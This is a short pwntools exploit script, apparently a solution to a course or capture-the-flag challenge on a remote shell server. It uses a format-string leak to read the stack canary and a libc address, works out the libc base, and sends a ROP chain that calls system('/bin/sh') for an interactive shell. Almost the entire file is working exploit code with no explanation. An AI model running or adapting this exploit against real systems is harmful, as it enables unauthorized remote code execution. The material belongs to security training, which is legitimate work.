from pwn import *

libc = ELF('libc-2.27.so')          # Load appropriate library
rop = ROP(libc)                     # Find appropriate gadgets

# Connect to shell server
p = remote('cs4401shell2.walls.ninja', 31371)

_libc_start_main_offset = libc.symbols["__libc_start_main"]  # Offset from libc base
 
p.sendline('%15$lx-%9$lx')                                   # Capture __libc_start_main+240 and canary
leak = p.recvline()
leak = str(leak)

canary = int(leak.strip().split('-')[1], 16)                 # Get canary value
log.info("Canary: " + hex(canary))                           # Feedback
print("\n")

_libc_start_main_240 = int(leak.strip().split('-')[0], 16)   # Get __libc_start_main+240
_libc_start_main = _libc_start_main_240-231                  # Get __libc_start_main, has to be 231 on server
_libc_base = _libc_start_main-_libc_start_main_offset        # Calculate libc base value

# Feedback
log.info("_libc_start_main_240: " + hex(_libc_start_main_240))
log.info("_libc_start_main: " + hex(_libc_start_main))
log.info("_libc_base: " + hex(_libc_base))
print("\n")

sys = _libc_base + libc.symbols["system"]                     # Get system
exit_addr = _libc_base + libc.symbols["exit"]                 # Get exit
binsh = _libc_base + next(libc.search("/bin/sh"))             # Get "/bin/sh"

log.info("System Address: " + hex(sys))
log.info("Exit Address: " + hex(exit_addr))
log.info("/bin/sh Address: " + hex(binsh))
print("\n")

pop_rdi_offset = (rop.find_gadget(['pop rdi', 'ret']))[0]      # Get pop rdi offset
ret_pad_offset = (rop.find_gadget(['ret']))[0]                 # Get extra ret. offset for MOVAPS

pop_rdi = _libc_base + pop_rdi_offset                          # Get pop rdi address
ret_pad = _libc_base + ret_pad_offset                          # Get ret. address

# Feedback
log.info("pop offset: " + hex(pop_rdi_offset))
log.info("ret offset: " + hex(ret_pad_offset))
log.info("pop rdi: " + hex(pop_rdi))
log.info("ret: " + hex(ret_pad))
print("\n")

# Construct malicious payload ROP chain 
payload = "A"*24 + p64(canary) + "B"*8 + p64(pop_rdi) + p64(binsh) + p64(ret_pad) + p64(sys) + p64(exit_addr)

p.sendline(payload)
p.interactive()